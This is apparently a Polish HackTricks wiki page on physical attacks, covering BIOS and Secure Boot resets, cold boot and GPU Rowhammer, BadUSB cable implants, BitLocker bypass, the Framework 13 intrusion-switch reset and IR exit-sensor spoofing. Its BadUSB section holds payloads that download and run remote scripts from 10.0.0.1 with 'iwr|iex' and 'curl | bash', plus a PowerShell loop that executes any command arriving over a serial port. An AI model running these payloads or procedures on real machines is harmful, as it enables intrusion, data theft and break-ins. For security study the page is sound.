# Ataki fizyczne

{{#include ../banners/hacktricks-training.md}}

## Odzyskiwanie hasła BIOS i bezpieczeństwo systemu

**Resetowanie BIOS-u** można przeprowadzić na kilka sposobów. Większość płyt głównych zawiera **baterię**, której wyjęcie na około **30 minut** spowoduje zresetowanie ustawień BIOS-u, w tym hasła. Alternatywnie można przestawić **zworkę na płycie głównej**, aby zresetować te ustawienia, łącząc określone piny.

W sytuacjach, gdy modyfikacje sprzętowe nie są możliwe lub praktyczne, rozwiązaniem są **narzędzia programowe**. Uruchomienie systemu z **Live CD/USB** z dystrybucją taką jak **Kali Linux** zapewnia dostęp do narzędzi takich jak **_killCmos_** i **_CmosPWD_**, które mogą pomóc w odzyskaniu hasła BIOS-u.

Jeśli hasło BIOS-u jest nieznane, trzykrotne wprowadzenie nieprawidłowego hasła **zwykle spowoduje wyświetlenie kodu błędu**. Kod ten można wykorzystać w witrynach takich jak [https://bios-pw.org](https://bios-pw.org), aby potencjalnie uzyskać działające hasło.

### Bezpieczeństwo UEFI

W przypadku nowoczesnych systemów korzystających z **UEFI** zamiast tradycyjnego BIOS-u można użyć narzędzia **chipsec** do analizowania i modyfikowania ustawień UEFI, w tym wyłączania funkcji **Secure Boot**. Można to zrobić za pomocą następującego polecenia:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Analiza pamięci RAM i ataki Cold Boot

Pamięć RAM krótko zachowuje dane po odcięciu zasilania, zazwyczaj przez **1–2 minuty**. Czas ten można wydłużyć do **10 minut**, stosując zimne substancje, takie jak ciekły azot. W tym wydłużonym okresie można utworzyć **zrzut pamięci** za pomocą narzędzi takich jak **dd.exe** i **volatility**, a następnie poddać go analizie.

---

## Rowhammer na GPU przeciwko tablicom stron

Współczesne ataki GPU Rowhammer stają się znacznie bardziej użyteczne, gdy ich celem są **metadane pamięci wirtualnej GPU**, a nie zwykłe bufory. Najnowsze badania dotyczące procesorów graficznych **GDDR6 NVIDIA Ampere** pokazują, że atakujący wykonujący nieuprzywilejowany kod CUDA może tworzyć specyficzne dla GPU wzorce hammeringu, używać **memory massaging** do umieszczania struktur stronicowania w podatnych wierszach, a następnie odwracać bity w **tablicy stron ostatniego poziomu** lub pośrednim **katalogu stron**. Gdy pojedynczy wpis translacji zostanie uszkodzony, atakujący może uzyskać **dowolny odczyt/zapis pamięci GPU**, a następnie przejść do kompromitacji hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Wzorzec eksploatacji

1. **Profilowanie wierszy podatnych na hammering** w GDDR6 i tworzenie uwzględniających odświeżanie / niejednorodnych wzorców hammeringu, które omijają mechanizmy ochrony w DRAM.
2. **Memory massaging alokacji GPU**, aby sterownik umieszczał struktury translacji stron w podatnych lokalizacjach fizycznych, zamiast przechowywać je w domyślnej chronionej puli. W praktyce może to oznaczać wyczerpanie obszaru niskiej pamięci przeznaczonego na tablice stron oraz rozrzucenie dużych, rzadkich mapowań UVM z kontrolowanymi odstępami.
3. **Odwracanie bitów metadanych translacji**, takich jak **PFN** lub bity związane z aperture, wewnątrz wpisu tablicy stron / katalogu stron, aby kontrolowana przez atakującego strona wirtualna wskazywała na strony tablic stron, dowolną pamięć GPU lub widoczne dla hosta mapowania systemowe.
4. Ponowne użycie sfałszowanego mapowania do nadpisania dodatkowych wpisów translacji i uzyskania **dowolnego odczytu/zapisu pamięci GPU** w różnych kontekstach GPU.

### Przejście na hosta i środki zaradcze

- Przy **wyłączonym IOMMU** sfałszowane mapowania systemowej aperture mogą udostępnić GPU dowolną **fizyczną pamięć hosta**, zamieniając prymityw GPU w pełną kompromitację hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** atakuje wpisy tablic stron ostatniego poziomu, natomiast **GeForge** pokazuje, że uszkodzenie poziomu katalogu stron może być łatwiejsze, ponieważ odwrócenie jednego bitu może przekierować większe poddrzewo translacji. Nie należy traktować tylko jednej warstwy stronicowania jako krytycznej dla bezpieczeństwa.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** nadal ma znaczenie, ponieważ blokuje bezpośrednią ścieżkę do dowolnej pamięci hosta wykorzystywaną przez GDDRHammer/GeForge, ale **nie jest kompletnym środkiem zaradczym**. **GPUBreach** pokazuje przejście drugiego etapu, w którym atakujący uszkadza zapisywalne przez GPU bufory CPU należące do sterownika, a następnie wywołuje błędy bezpieczeństwa pamięci w sterowniku NVIDIA, aby uzyskać prymityw zapisu do jądra i **shell roota**, nawet przy włączonym IOMMU.<sup>[[3]](#references)</sup>
- **ECC na poziomie systemu** jest praktycznym krokiem hardeningu na obsługiwanych GPU do stacji roboczych i serwerów. Konsumenckie GPU bez ECC zapewniają słabszą powierzchnię obrony.<sup>[[4]](#references)</sup>
- Ataki te nie są wyłącznie teoretyczne: **GeForge** odnotował **1171** odwróceń bitów na RTX 3060 i **202** na RTX A6000, co wystarczyło do stworzenia działającego łańcucha eskalacji uprawnień na hoście.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Ataki Direct Memory Access (DMA)

**INCEPTION** to narzędzie zaprojektowane do **manipulowania pamięcią fizyczną** za pośrednictwem DMA, kompatybilne z interfejsami takimi jak **FireWire** i **Thunderbolt**. Umożliwia omijanie procedur logowania poprzez modyfikowanie pamięci tak, aby akceptowane było dowolne hasło. Jest jednak nieskuteczne w systemach **Windows 10**.

---

## Live CD/USB do uzyskiwania dostępu do systemu

Zmiana plików binarnych systemu, takich jak **_sethc.exe_** lub **_Utilman.exe_**, na kopię **_cmd.exe_** może zapewnić wiersz poleceń z uprawnieniami systemowymi. Narzędzia takie jak **chntpw** mogą służyć do edycji pliku **SAM** instalacji Windows, umożliwiając zmianę haseł.

**Kon-Boot** to narzędzie ułatwiające logowanie do systemów Windows bez znajomości hasła poprzez tymczasową modyfikację jądra Windows lub UEFI. Więcej informacji można znaleźć pod adresem [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Omijanie funkcji bezpieczeństwa Windows

### Skróty uruchamiania i odzyskiwania

- **Supr**: Dostęp do ustawień BIOS.
- **F8**: Wejście do trybu odzyskiwania.
- Naciśnięcie **Shift** po wyświetleniu banera Windows może ominąć automatyczne logowanie.

### Urządzenia BAD USB

Urządzenia takie jak **Rubber Ducky** i **Teensyduino** służą jako platformy do tworzenia urządzeń **bad USB**, zdolnych do wykonywania zdefiniowanych payloadów po podłączeniu do komputera celu.

### Volume Shadow Copy

Uprawnienia administratora pozwalają na tworzenie kopii wrażliwych plików, w tym pliku **SAM**, za pomocą PowerShell.

## Techniki implantów BadUSB / HID

### Implanty kablowe zarządzane przez Wi-Fi

- Implanty oparte na ESP32-S3, takie jak **Evil Crow Cable Wind**, są ukryte wewnątrz kabli USB-A→USB-C lub USB-C↔USB-C, identyfikują się wyłącznie jako klawiatura USB i udostępniają swój stos C2 przez Wi-Fi. Operator musi jedynie zasilić kabel z hosta ofiary, utworzyć hotspot o nazwie `Evil Crow Cable Wind` i haśle `123456789`, a następnie przejść do [http://cable-wind.local/](http://cable-wind.local/) (lub jego adresu DHCP), aby uzyskać dostęp do wbudowanego interfejsu HTTP.<sup>[[8]](#references)</sup>
- Interfejs przeglądarkowy udostępnia karty *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Zapisane payloady są oznaczane według systemu operacyjnego, układy klawiatury są przełączane w locie, a ciągi VID/PID można zmieniać tak, aby naśladowały znane urządzenia peryferyjne.
- Ponieważ C2 znajduje się wewnątrz kabla, telefon może przygotowywać payloady, uruchamiać ich wykonanie i zarządzać danymi uwierzytelniającymi Wi-Fi bez ingerencji w system operacyjny hosta — idealne rozwiązanie w przypadku krótkotrwałych fizycznych włamań.

### Payloady AutoExec rozpoznające system operacyjny

- Reguły AutoExec wiążą jeden lub więcej payloadów z natychmiastowym uruchomieniem po enumeracji USB. Implant wykonuje uproszczone rozpoznawanie systemu operacyjnego i wybiera pasujący skrypt.
- Przykładowy przebieg:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) lub `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Ponieważ wykonanie odbywa się bez nadzoru, samo podmienienie kabla do ładowania może zapewnić początkowy dostęp w stylu „plug-and-pwn” w kontekście zalogowanego użytkownika.

### Zdalny shell przez Wi-Fi TCP uruchamiany za pomocą HID

1. **Inicjalizacja za pomocą naciśnięć klawiszy:** Zapisany payload otwiera konsolę i wkleja pętlę wykonującą wszystko, co nadejdzie na nowym urządzeniu szeregowym USB. Minimalny wariant dla Windows to:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant utrzymuje otwarty kanał USB CDC, podczas gdy jego ESP32-S3 uruchamia klienta TCP (skrypt Python, APK Androida lub plik wykonywalny na komputerze) łączącego się z operatorem. Wszystkie bajty wpisane w sesji TCP są przekazywane do opisanej wyżej pętli szeregowej, zapewniając zdalne wykonywanie poleceń nawet na hostach odizolowanych od sieci. Dane wyjściowe są ograniczone, dlatego operatorzy zazwyczaj wykonują polecenia „w ciemno” (tworzenie kont, przygotowywanie dodatkowych narzędzi itd.).

### HTTP OTA update surface

- Ten sam web stack zwykle udostępnia nieuwierzytelnione aktualizacje firmware. Evil Crow Cable Wind nasłuchuje na `/update` i wgrywa dowolny przesłany plik binarny:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Operatorzy terenowi mogą wymieniać funkcje podczas działania (np. wgrać firmware flash USB Army Knife) w trakcie engagementu bez otwierania kabla, umożliwiając implantowi przełączanie się na nowe możliwości, gdy nadal jest podłączony do hosta docelowego.

## Omijanie szyfrowania BitLocker

Szyfrowanie BitLocker można potencjalnie obejść, jeśli **hasło odzyskiwania** zostanie znalezione w pliku zrzutu pamięci (**MEMORY.DMP**). Można w tym celu użyć narzędzi takich jak **Elcomsoft Forensic Disk Decryptor** lub **Passware Kit Forensic**.

---

## Social Engineering w celu dodania klucza odzyskiwania

Nowy klucz odzyskiwania BitLocker można dodać za pomocą taktyk social engineering, przekonując użytkownika do wykonania polecenia, które doda nowy klucz odzyskiwania złożony z zer, upraszczając w ten sposób proces odszyfrowywania.

---

## Wykorzystanie przełączników otwarcia obudowy / konserwacyjnych do przywrócenia BIOS-u do ustawień fabrycznych

Wiele nowoczesnych laptopów i komputerów stacjonarnych small form factor zawiera **przełącznik otwarcia obudowy**, monitorowany przez Embedded Controller (EC) oraz firmware BIOS/UEFI. Choć głównym przeznaczeniem przełącznika jest wygenerowanie alertu po otwarciu urządzenia, producenci czasami implementują **nieudokumentowany skrót odzyskiwania**, uruchamiany po przełączeniu przełącznika w określony sposób.<sup>[[5]](#references)[[6]](#references)</sup>

### Jak działa atak

1. Przełącznik jest podłączony do **przerwania GPIO** w EC.
2. Firmware działający w EC śledzi **czas oraz liczbę naciśnięć**.
3. Po rozpoznaniu zakodowanego wzorca EC wywołuje procedurę *mainboard-reset*, która **usuwa zawartość systemowego NVRAM/CMOS**.
4. Przy następnym uruchomieniu BIOS ładuje wartości domyślne – **hasło supervisor, klucze Secure Boot oraz cała niestandardowa konfiguracja zostają wyczyszczone**.

> Po wyłączeniu Secure Boot i usunięciu hasła firmware'u atakujący może po prostu uruchomić dowolny zewnętrzny obraz systemu operacyjnego i uzyskać nieograniczony dostęp do dysków wewnętrznych.

### Przykład z rzeczywistego świata – laptop Framework 13

Skrót odzyskiwania dla Framework 13 (11./12./13. generacji) to:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Po dziesiątym cyklu EC ustawia flagę instruującą BIOS, aby przy następnym ponownym uruchomieniu wyczyścił NVRAM. Cała procedura zajmuje około 40 s i wymaga **wyłącznie śrubokręta**.<sup>[[5]](#references)</sup>

### Ogólna procedura Exploitation

1. Włącz urządzenie lub wybudź je ze stanu uśpienia, aby EC działał.
2. Zdejmij dolną pokrywę, aby uzyskać dostęp do przełącznika wykrywania ingerencji/konserwacyjnego.
3. Odtwórz wzorzec przełączania specyficzny dla danego vendora (sprawdź dokumentację i fora albo przeprowadź reverse engineering firmware'u EC).
4. Złóż urządzenie ponownie i uruchom je ponownie – zabezpieczenia firmware'u powinny być wyłączone.
5. Uruchom live USB (np. Kali Linux) i wykonaj standardowe post-exploitation (credential dumping, eksfiltrację danych, implantowanie złośliwych binariów EFI itp.).

### Wykrywanie i Mitigation

* Rejestruj zdarzenia naruszenia obudowy w konsoli zarządzania systemem i koreluj je z nieoczekiwanymi resetami BIOS-u.
* Stosuj **plomby zabezpieczające przed manipulacją** na śrubach/pokrywach, aby wykrywać ich otwarcie.
* Przechowuj urządzenia w **fizycznie kontrolowanych obszarach**; zakładaj, że fizyczny dostęp oznacza pełną kompromitację.
* Jeśli jest dostępna, wyłącz funkcję vendora „maintenance switch reset” albo wymagaj dodatkowej kryptograficznej autoryzacji resetów NVRAM.

---

## Covert IR Injection przeciwko No-Touch Exit Sensors

### Charakterystyka sensorów
- Dostępne na rynku sensory „wave-to-exit” łączą emiter LED near-IR z modułem odbiornika w stylu pilota do telewizora, który zgłasza stan logic high dopiero po wykryciu wielu impulsów (około 4–10) właściwej częstotliwości nośnej (około 30 kHz).<sup>[[7]](#references)</sup>
- Plastikowa osłona uniemożliwia bezpośrednie wzajemne obserwowanie emitera i odbiornika, dlatego kontroler zakłada, że każda zweryfikowana fala nośna pochodzi z pobliskiego odbicia, i steruje przekaźnikiem otwierającym zaczep drzwiowy.
- Gdy kontroler uzna, że cel jest obecny, często zmienia obwiednię modulacji sygnału wychodzącego, ale odbiornik nadal akceptuje każdy burst pasujący do odfiltrowanej częstotliwości nośnej.

### Przebieg ataku
1. **Zarejestruj profil emisji** – podłącz analizator stanów logicznych do pinów kontrolera, aby zarejestrować zarówno przebiegi przed detekcją, jak i po detekcji, które sterują wewnętrznym LED-em IR.
2. **Odtwórz wyłącznie przebieg „post-detection”** – usuń lub zignoruj fabryczny emiter i steruj zewnętrznym LED-em IR za pomocą wzorca wyzwalanego już po detekcji, odtwarzanego od samego początku. Ponieważ odbiornik interesuje się wyłącznie liczbą i częstotliwością impulsów, uznaje spoofowaną falę nośną za prawdziwe odbicie i aktywuje linię przekaźnika.
3. **Bramkuj transmisję** – przesyłaj falę nośną w dostrojonych burstach (np. przez kilkadziesiąt milisekund włączona i przez podobny czas wyłączona), aby dostarczyć minimalną liczbę impulsów bez nasycania układu AGC odbiornika ani logiki obsługi zakłóceń. Ciągła emisja szybko zmniejsza czułość sensora i uniemożliwia zadziałanie przekaźnika.

### Injection odbiciowy dalekiego zasięgu
- Zastąpienie laboratoryjnego LED-a diodą IR dużej mocy, sterownikiem MOSFET i optyką skupiającą umożliwia niezawodne wyzwalanie z odległości około 6 m.
- Atakujący nie potrzebuje line-of-sight do apertury odbiornika; skierowanie wiązki na wewnętrzne ściany, regały lub framugi drzwi widoczne przez szybę pozwala odbitej energii wejść w pole widzenia o szerokości około 30° i naśladować machnięcie dłoni z bliskiej odległości.
- Ponieważ odbiorniki oczekują wyłącznie słabych odbić, znacznie silniejsza zewnętrzna wiązka może odbić się od wielu powierzchni i nadal pozostawać powyżej progu detekcji.

### Uzbrojona latarka do ataku
- Umieszczenie sterownika wewnątrz komercyjnej latarki ukrywa narzędzie na widoku. Zastąp widoczny LED-em diodą IR dużej mocy dopasowaną do pasma odbiornika, dodaj ATtiny412 (lub podobny układ) do generowania burstów o częstotliwości około 30 kHz i użyj MOSFET-a do odprowadzania prądu LED-a.
- Teleskopowa soczewka zoom zawęża wiązkę, zwiększając zasięg i precyzję, natomiast silnik wibracyjny sterowany przez MCU zapewnia haptyczne potwierdzenie aktywności modulacji bez emitowania światła widzialnego.
- Przełączanie między kilkoma zapisanymi wzorcami modulacji (z nieznacznie różnymi częstotliwościami nośnymi i obwiedniami) zwiększa kompatybilność z różnymi rodzinami sensorów sprzedawanych pod innymi markami, umożliwiając operatorowi przeszukiwanie powierzchni odbijających, aż przekaźnik wyda słyszalny klik i drzwi się otworzą.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
